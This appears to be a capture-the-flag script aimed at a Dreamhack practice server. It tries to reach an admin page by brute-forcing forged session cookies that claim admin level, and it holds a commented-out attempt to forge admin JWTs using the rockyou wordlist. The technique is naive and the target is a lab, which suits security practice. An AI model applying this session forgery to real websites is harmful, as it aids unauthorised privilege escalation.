# standard imports
import requests
import os 
import binascii
import base64
import jwt



url = "http://host1.dreamhack.games:8310/login"

session_string = {"userid":"jako","password":"jako"}

r = requests.post(url, data=session_string)

for _ in range(1,30000):

	session_1 = "eyJpZHgiOjEsImxldmVsIjoiYWRtaW4iLCJuYW1lIjoiQXBwbGUiLCJ1c2VyaWQiOiJBcHBsZSJ9"
	session_2 = ".XvtnQQ."
	# session_3 = os.urandom(32).hex()[0:28] 
	session_3 = os.urandom(32).hex()
	new_cookie = session_1 + session_2 + session_3
	r = requests.get("http://host1.dreamhack.games:8310/admin" ,cookies={"session":new_cookie})
	print("trying key\n" +new_cookie)
	print(r.text)
	if "DM" in r.text:
		print(r.text)


# with open("/usr/share/wordlists/rockyou.txt",encoding="latin-1") as handle:
# 	for x in handle.readlines():

# 		session_string = jwt.encode({"idx":1,"level":"admin","name":"Apple","userid":"Apple"},str(os.urandom(32)),algorithm="HS256")
# 		session_string = session_string.decode()[0:-18]

# 		print("trying secret_key {}" .format(session_string))
# 		print("\n")
# 		r = requests.post(url, cookies={"session":session_string})

# 		print(r.text)
# 		exit()
# 		if "{" in r.text:
# 			print(r.text)